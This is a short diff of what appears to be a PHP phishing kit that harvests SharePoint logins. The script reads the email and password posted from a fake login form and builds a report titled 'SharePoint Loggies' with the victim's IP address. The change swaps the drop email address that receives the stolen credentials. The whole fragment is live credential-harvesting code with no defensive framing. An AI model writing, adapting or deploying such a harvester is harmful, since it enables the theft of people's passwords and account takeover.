@@ -5,7 +5,7 @@ if(!empty($_POST)) {
  $amu= $_POST['email'];
  $otu = $_POST['password'];
  
-		$omeka = "hdxcvpaul@gmail.com";
+		$omeka = "carnagiemelissa@gmail.com";
 		
 		
          $ishiozi = "SharePoint Loggies : $ip";
